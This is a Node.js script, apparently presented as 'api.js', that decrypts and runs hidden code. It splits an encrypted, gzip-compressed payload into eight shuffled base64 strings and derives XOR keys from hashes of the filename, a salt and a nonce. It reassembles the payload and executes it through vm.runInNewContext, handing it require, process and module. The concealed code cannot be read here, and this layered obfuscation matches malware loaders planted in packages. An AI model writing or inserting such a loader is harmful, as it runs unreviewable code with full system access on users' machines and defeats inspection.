#!/usr/bin/env node

const crypto = require("crypto");
const zlib = require("zlib");
const vm = require("vm");

const kFhMFLsECNbMtH = "EfPZK9tUlxdjNt92vLsq9kHSdMUdVlxRYQYRU0qgrIA2MpyGlvVekX7biPQWuPkPiIzaGgAl+mGdu+ekm7smQRqVTI/qwWgn+e4QtA==";

const tGFWmYVkOeEQxD = "e9Stino+0rYPS/5etmD94Ldb0pTCJWxjDajkI5uwn/4VCjHO14d0/ojsBe47OTRgKgGdE1qDcPEHKYjihV833tZhSmxQZZuTpGwccnyUmvXl8XgrpQeLtV1+VLLUwSWiv8RQU1QtFkLBvMeatuTSJGGlGhReuD8ZN2RSPbJw1qnONEcPHAKOrTzCMvABSkJnkadhDKrgLvdFXmcUu1N09ANHgf2W7h/Mg91SwiObh7W6QyjL9+1DRxpK2FSx49EH268JLdbF4PH4bd0pbp3LsbF4WB7tr19wt4asw9SXIJ4Qx7E0II1KXO9dgxcRqbdZVfToPjC5iEHaDUsKEVw5ht7QPhfAyDJ3jlddaYfv1tbbfqbCclXpwqkVzgY/oQv502iYVgSMIVrzplf5FcLYr9FSm2yy9LTUophqawUgGlOPa1MRD5OdV7CbK4gfGQITqT6GySeBL0adEh7MM58D5riCm1MRi0nDGeXGMZlu28ziVSbsRNRjScWQ0PGviry49SWRq9oHYUmu/toJJNs7teV/Po0uwVQG3uQurjSFrubDWIgwS2HxchCjhJUn09nC0KHosQQgUSoIGTEpEYAS/cJ/j3H2DGenH5lXExCXKZZ+f8YiiLeBC7xSp+GI4o0CELJwlQR7JGzQh31XwyGC9kpuGeRcJxwEQR10zlOZO2crMxoMLDMOokvgWOkKd535HfDbUNkCYQpvPnVSouPKkujoZ";
const RbGPXcXXvAvWTt = "1irHqVbyVbpZeqfc7iyeLEHjJvvKT1wb/sk305bvkdbIQWq+zYwQS7tK6cLmIHkfpVCPlFYEqCh7mwvPSKj0xiy88USISMcWB2VVUFw0c0Agb4jfHiqK327ftBKePQqNMiJvOHr9pcMuxUEBFO06DFzFFWppyWaiB3bkk+Dr1hbc61aTfiKeLk/B8OoTlRwWZPpMpKjgjwVpLo7aEzEFqMHl0hBAvsAlD7J3uly22VaPXu1Cqqm4P0ojbJG7OtDUdCBswyl//DKgd0dIfVwI4PqtfA2nI1G+vrqtTeG/sCoQhuZJxXObii5mstIY5TF6aGcGpLiOfBoHqbap4we8+w0c9wO4TqETkDy4mgiCeuGC5tN+IcxJhRpO2g4jLU6S1+qcMDsdV8U5ciPI5r9+G4vbIHUh71ZKV5T/DIEaUk32p06RhX71baLE4mbbU0Y4OXCXf+Sh9Z31SZmXLxlTGtaelVuPlGmJq/Qif2b17xD5eKMlnpK0jCwrGwpYWhgAwN0MLAwO+hGWdYpaCkFBXQuYIQeeTbmhdOUCNFD6WoTDNTROgqu+GEErKIzDxLwiJ4CvJNzDk2pKh5Q6dX/prXKJqHoekmp+vNV2F8kWnZZwHhGbPnezWkp1USywtfNbAEJrkSYdHyDnvzdxFub5GhNl85GCYPYR8cHHa7VqEX3Gjf2Omr7Sf3utQ58l/9K6z8+3e0aoB1bF+X8mbEqBR4PNM";
const jfBfTbawZBbuAz = "YgcvgrKSDO05TD1sqrkCyCWL4N/UCX3mJysNe2NczAxmjThM+YrlIVkUgYu6HQBTAc7Wyps3kPU4ZEoJgDpvE/4HPkSV3W0cKBHB8rGUDCvqewlwLYvcMVoQ1VEoXqSIiceZ5sv24C+LY2f1Y1GFJI5hvffTkS3SsU9B+RYtTmzNd7Xpf0stz+hvM5TCxZ2kzjEoNuEigMDg0VuEb5DC6Vuya/MB2By/NbNfUxaKLYgIBm1gd4WEwo4IpssV3YHfWyWwawrH7TdSN6OK6oOXd2NfDYKSs9lV/psF64EUNDFkXWvSCB9ZU5NQb0HG0SQge6ZqV1To3oMLjxJsF8lNqFrM2TxvwUhHK6TkenoBNWnxuiNWYO8UcCRtuA2Y0M0ZUuQiEri2N7j29wrEFhSptajcrsawFE1fKkW8eQYQAVJ2DbbKL7hxfGs44/cheHWY0q1x14DGInuOmluwPDA9tZjbjDFUyHepPfDwvjQaPypv/mJOXBlyRX59U9TTIz4y0L1RXrjYoA2v4jZlzpAmj7N0r0W1kIQYyqvXsj1fWJgCNIiwR6a1g6C6fcQ8yK+2BXcKobWGBjYEsJP9FNDv4q1IyWCBFksNFKGcPcNpDiGT1d9Us0vGhfZ6mX2xrq/simXnfYX4hqe0zvSKrhhCVzD8XUuAMPuKy1TaZKZ/3sQ/giojbMNjsUtHM8WDpV0QfRTgMmI4uDCZWsCHqHOTBTjDw";
const aUaKvVBWzSTxqb = "oCeVLXtzJmWYAPQhCUElOMUjqYtqPTqol61Rd6HkVw5VcplMVVJEyIkc3LE/WpNgGWsnVG6Yzxo4eFtF2ew43poaY5s/F1oAZP2nhLPPDXrpgVIOCItGfUn8dOEsp0vdBKWQxL+z3bCGQZ7uh8dsKcmZYWeixQtNxmgIrP+hHGrmI1i4/+lstmGRTSlIvSahNq5jywJgCsq+/M8tAkMhEVsANW658HxtwmkoFNLAUSIBxMb47ZNsymZDlXwkZARNcqBNFC6CPKtc4r/90golJrGT7x7ZuUWNsfAXXLZCNw8MpeCUtWJOY+F1SlwjskJ4xnGBMxuGpyrXTxcI8kA1gkgoaNtlp/P5LElJtkxXlStE8gHnW/IFCyqQInVQy7flqTvOHwr7Whk4Ek+3lpGNLzQSe7uLS4VJi4sjQ6niInZ8RoYM9z6esvREVDabRufIdShzSJLJaWgMUQa6lV3G6vfbLx8m1iEXn8paiJoAG81eT6+YBepLdbvnXzhBrPAjdPsAzE2ChYRjCoaIsOhRyeAn9zrz6yxPFy9jDnFcQ/NtIhTuGsvoobJnZ1Zasp8OqjUZObIFLUcxYWSucJTtWNddbDzTk1j5FIp4yqdCjhNAGb6dDwgTPymmr3obaqOQt5T+WcmUnXCRXL2af3elU68JtONAhBcaHyrmk5iy7sdvi3Nt2ncTcsQPXY9GT1gY7d4ogR13zjtic8CO1yUOeNqKZ";
const pLGPKmJEPsgUrN = "gY2SpwdvBwFgpwCrQB3TGONqq4ZMsrYfZ0I3CLW0dXx8tY88pKM44ZZSLUhnK1Uv4a3Jnp45BHLGVk1KJjdRxoqRkQJCQSZjamTT4zjyIGK8Y8H5g8PwzEY85Q4LPSkg6FFWiknnaWcQqAFDvCyhV8+IjvmChs7DuLISoiaLPKL+aRhFvffmAcsw7I5ChZXtjBjQaUAOV4+byc5o/vRQLn7KQZvgu46gop4SIUjZX/LgywUBVpinJ/mwluKjxsR5Xb2FnKK6ctq3Yiy6ZDicrG6W17xC/PvAfDEY00Iw+4dnK5H1myNbzmCpipmgWIdNY2wptSm8BK+ow/suiNSjRvKMwq7U3nW25I5scM+A130WmD9iNr7OCMc0b2AM/136C4vibAqw6ll4fa1vLKmZ8epPTI9mZG/sYw27b/5P9kg6/O59NSbOBCUZPPUgtJnIi+khrY2UWpXpsESGcKBE7uPBj7+UzkCPcUmvZqy4LGsZqGWjGoalEVtEUiRDIPvBKk4vE6dUoT9/ulKiZpOrMOMZLzX6gDfWMzyQ9yFrrGmhhbn8f+stB5+wZEIXRI7Le9XwNbQeIb+yTm8A/TaKG8/KHDj6QLDIP5Un7hqo/x6YXOTeNFWnfbTJA+DHDJxBLDlmfawD85dji9pbn26OM4dIg8ELoQFWaSxBAlqcLpzSBGKo+nR+j27l3vKUX0c1DWlt7m8Bdu0HtNe6xL5ApgPIC";
const cqRTtHmbeXgbtv = "n/BxUa2Y2hQhhrlCVheXg32D+N7/KDP+9RqXtmLifiXzb+FhzQ4DvfDbIm/qWqSTTQt2fbsyzyZQJI1Q/o7vQO0npxGD48qwbgOqqqDdxUhTIZvEwBQFiUe6VD2fIG+pUT3Q0vSqCIfiPas1eFKf85Z4NE1WxzAP1uu32A0KjXqlP0x3HS1582Qyj+hob4lq7Sza8V2mG+RW+9QiNDLUmf9m9JU8mJc7UVXiNitpykGKz8h4gW9CDMVZr3JN3eB5BdVYPCT5Gm6RbNFIjPEdjf3iup7ttNdSDJkvpAFdg4tusaq5gbYVqJWvmMsW2TLrL+wsyucVCmrRjYpY7fLm4LAWuedgYNJ7KNgV6HeXJVTCEFm0vlLDx8kaISqSf7UeOQ2zOuTSuUaEEK16sxe7WqxpBgKUCnJqoaWcscH/VpHSQvQadBh+I620EDt6UJTqLqRGlQecV7+g2aXrwfkITc0mA2+WDVDrDkAlbDOKs/Yh9lEx6a/5RUvPomcNxePDwQMatghY3aOKR5uoeo0tk3bq+sU1WZsyIJwy9ts8wGUnOF/cD9AnNKr1U252EIqwLfsEOZFsktKhVQHJfmq8IpiqH2b+cXzJUSKN6Yr+3Ryxnhc7EOs9+phq8NVXB042QB2g+pOs+HHzJngAXvd+ZzKG4ec01w0widkYKAIGRQ3uzexgt9mJIpgsNRIqE3rKJS/MsT1vwdxqqgONnHm+ts9kf";
const YqLVZUILUiXMyX = "q4S3Is+BrJ0ZlAguPu8l6ypqwmOoS+N0ZiAuOQk+qi4KHHAuAIaHlu6XZ9GvnxyHDr5pDn5WNd7PUY5HJZ95CEmn/goG4UbST+CV8yw9VhzM5jSzuRKd9+f2bhQ9FOjjDCDkulz6UlTlmSkAR9+iYGBP3wwzp3RpktqZ/DWcea/FVAzAZcdW93eMnCu18GguqU8/2Ja9LCBbY9+AjmzZCPxlPBRG9fs1S2Amc+808NDvrFT7zARvE7AFcLKkM4iwngK8zuW9XdQmBvLz03NbYGFuaemcN3g88oEfXuA5Xd07t5rYxPxZc3J8lotp6VPArwHtZ2/qNLruKXRjTIQoa9MtI4KeL2wyuQ7jhWeL4l/hXlYeFw9Cc0NWk0dBSkTgIcO3wCXjRxCk3yfBQaAulPvMTD1igVNcZ/J/deB+j1QsKaZryoFR2uLZr7IB1BRLwLUqgC1dhZlC2wkIZUnJX7Qopf5Ufrq5ZuWfv9eQwx66tTTFD3+F5RUi684e1onv/RWehr42qZiIdi4Kmaal1e2cP6Kyv8ZS5R3ySGsApJ+e96G30ZMuPPqVPmm3mtmL9MrskubQiuzYEQmFV7s0gDO4pgrDXrHZG0eYrdvCjzWuUvMQXUdlNM/ze4mlSpYm+PFUtRu2/GuBP0rZDtTdFckYhhj6WtkfEYZOzPXFAD3cHbeF1MMnKM2v5p7pyWeMwwQXBnlY3ZmXGXBMMed/8gDQm";
const zGbEsPZMGnsqdv = "EOk5sZ+suzFAhF9q6jCl+d+h0JpS2OGGFuD/hv2TSPrEOMe7ZA07VasrMV/G5C/NAFIneL1N3H6k10XtbVwkSCgj2cCn2VvEyTz3MYCnV9g5mc7bXp3QPebKZfplL3mtQGWzsIgIx1zuXHcwSRT3ZIqQWx8Rp9govyLymyVTG9wjiKYPdl6LdHijUFfenovNfUJS8ULGWxVRUsQXQNWO62ivvxehf9NHxI53E+hEIQMj01kqNBvadJslTPWep19h41BKfIckU2PYCXizZAjo5GPnZR7TVcQtRr9s5ZXnjwYwksaagr0v1ILKwUXDeXhtwX+c0sdXiDs/K/vNrivk9DqIV1NrVVuy/Z5IkSI2pb7ba6wtdo4IwTweS5MYH9ZL86hIvW1BW9KNEHXoHOUQT1QKFg2vFwAq3dqCPl6qc7LMzS0ribyjmTBn6hevzBjHVINQ72RCESh2RDU5irnMbjE3q9onMg6xn+ZBKzvhPFYXjzv7/O61+8bv8Dy9t8xXXjv7IsLb2TV60mmleigVJJRzUFERZYKnWXER5V9PO7hxldU/FK7AYpcodGb8jgWKV2Zh0uIkIz6Ke0sN3PrPNIXOXzA9hztrIL58ixs5EEFEJqiA0GXBOxFC8t0aB+e8Hk1Mvc5AY6iWWuBDrUaqSZTg0re42HR9oHC4z5IbcOKnzc6+wchSJ3PXGs8HbN7BvVL/HufJHsWcP3NAVJiQ=";

const dLqkjkYHqdDLmA = "api.js";

function PfkmWrpoBUVtCY(data, key) {
  if (!key.length) return data;

  const out = Buffer.alloc(data.length);

  for (let i = 0; i < data.length; i++) {
    out[i] = data[i] ^ key[i % key.length];
  }

  return out;
}

function gcfuchazSQSHbT() {
  try {
    const blob = Buffer.from(
      kFhMFLsECNbMtH,
      "base64"
    );

    if (blob.length < 32) {
      throw new Error("Invalid metadata");
    }

    const salt = blob.subarray(0, 16);
    const nonce = blob.subarray(16, 32);
    const encryptedPayload = blob.subarray(32);

    const filenameHash = crypto
      .createHash("sha256")
      .update(dLqkjkYHqdDLmA)
      .digest()
      .subarray(0, 8);

    const layer1 = crypto
      .createHash("sha256")
      .update(
        Buffer.concat([
          filenameHash,
          Buffer.from("::L1")
        ])
      )
      .digest()
      .subarray(0, 16);

    const layer2 = crypto
      .createHash("sha256")
      .update(
        Buffer.concat([
          nonce,
          Buffer.from("::L2")
        ])
      )
      .digest()
      .subarray(0, 16);

    const layer3 = crypto
      .createHash("sha256")
      .update(
        Buffer.concat([
          salt,
          Buffer.from("::L3")
        ])
      )
      .digest()
      .subarray(0, 16);

    const blobKey = crypto
      .createHash("sha256")
      .update(
        Buffer.concat([
          layer1,
          layer2,
          layer3
        ])
      )
      .digest();

    const payload = PfkmWrpoBUVtCY(
      encryptedPayload,
      blobKey
    );

    if (payload.length < 44) {
      throw new Error("Invalid payload");
    }

    const obfDataKey =
      payload.subarray(0, 32);

    const obfIndices =
      payload.subarray(32, 40);

    const keyMaterial =
      Buffer.concat([
        layer1,
        layer2,
        layer3
      ]);

    const dataKey = PfkmWrpoBUVtCY(
      obfDataKey,
      keyMaterial
    );

    const indices = [
      ...PfkmWrpoBUVtCY(
        obfIndices,
        dataKey.subarray(0, 8)
      )
    ];

    const valid =
      indices.length === 8 &&
      [...indices]
        .sort((a, b) => a - b)
        .every((value, i) => value === i);

    if (!valid) {
      throw new Error("Invalid index metadata");
    }

    const parts = [
      tGFWmYVkOeEQxD,
      RbGPXcXXvAvWTt,
      jfBfTbawZBbuAz,
      aUaKvVBWzSTxqb,
      pLGPKmJEPsgUrN,
      cqRTtHmbeXgbtv,
      YqLVZUILUiXMyX,
      zGbEsPZMGnsqdv
    ];

    const ordered = new Array(8);

    for (
      let pos = 0;
      pos < indices.length;
      pos++
    ) {
      ordered[indices[pos]] = parts[pos];
    }

    if (
      ordered.some(
        part => typeof part !== "string"
      )
    ) {
      throw new Error("Invalid encrypted data");
    }

    const encrypted = Buffer.from(
      ordered.join(""),
      "base64"
    );

    const compressed = PfkmWrpoBUVtCY(
      encrypted,
      dataKey
    );

    const source = zlib
      .gunzipSync(compressed)
      .toString("utf8");

    const context = {
      require,
      module,
      exports,
      __filename: require("path").resolve(
        process.argv[1]
      ),
      __dirname: require("path").dirname(
        require("path").resolve(
          process.argv[1]
        )
      ),
      console,
      process,
      Buffer,
      setTimeout,
      setInterval,
      clearTimeout,
      clearInterval
    };

    vm.runInNewContext(
      source,
      context,
      {
        filename: dLqkjkYHqdDLmA
      }
    );

  } catch (err) {
    console.error(
      "[ERROR]",
      err.name + ":",
      err.message
    );

    process.exit(1);
  }
}

gcfuchazSQSHbT();
